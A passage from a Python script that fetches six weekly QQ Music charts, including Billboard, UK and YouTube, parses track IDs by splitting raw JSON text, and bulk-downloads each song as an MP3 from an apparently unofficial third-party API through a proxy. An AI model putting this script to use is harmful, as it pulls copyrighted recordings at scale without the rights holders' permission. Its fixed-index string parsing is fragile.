url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI927923957731881&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A123%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载iTunes榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载iTunes榜\n-----------------------")

#下载香港地区榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI5967259500096698&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A59%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载香港地区榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载香港地区榜\n-----------------------")

#下载台湾地区榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI6779920900640612&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A61%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weekThursday+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载台湾地区榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载台湾地区榜\n-----------------------")

#下载美国公告牌榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI789519803156091&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A108%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载美国公告牌榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载美国公告牌榜\n-----------------------")

#下载英国UK榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI6999765872270489&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A107%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载英国UK榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载英国UK榜\n-----------------------")

#下载Youtube榜
years=str(datetime.datetime.now().year)
weeks=str(int(time.strftime("%W")))
header_dict = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
url="https://u.y.qq.com/cgi-bin/musicu.fcg?-=getUCGI310470239025161&g_tk=5381&loginUin=0&hostUin=0&format=json&inCharset=utf8&outCharset=utf-8&notice=0&platform=yqq.json&needNewCode=0&data=%7B%22detail%22%3A%7B%22module%22%3A%22musicToplist.ToplistInfoServer%22%2C%22method%22%3A%22GetDetail%22%2C%22param%22%3A%7B%22topId%22%3A128%2C%22offset%22%3A0%2C%22num%22%3A"+num+"%2C%22period%22%3A%22"+years+"_"+weeks+"%22%7D%7D%2C%22comm%22%3A%7B%22ct%22%3A24%2C%22cv%22%3A0%7D%7D"
req = request.Request(url='%s' % (url),headers=header_dict)
res = request.urlopen(req)
res = res.read()
out=res.decode(encoding='utf-8')
a=out.split(",\"type\":0,\"mid\":\"")
ids=[]
names=[]
authors=[]
for i in range(len(a)):
    if i==0:
        continue
    else:
        b=a[i].split("\"")
        ids.append(b[0])
        names.append(b[4])
        authors.append(b[28])
print("############")
print("开始下载YouTube榜")
print("############")
for i in range(len(ids)):
    file_url = "https://music.hwkxk.cn/api/?source=QQHD&id="+ids[i]
    print("正在下载："+names[i])
    time.sleep(2)
    r = requests.get(url=file_url,headers=headers,params=data,proxies=proxy)
    au=authors[i].split("/")
    authors[i]=au[0]
    mName=names[i]+"--"+authors[i]+".mp3"
    mName=checkFileNameValid(mName)
    with open(mName, "wb") as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
print("_________________")
print("已下载Youtube榜\n-----------------------")



print(" #\n__\n下载完成，感谢使用")
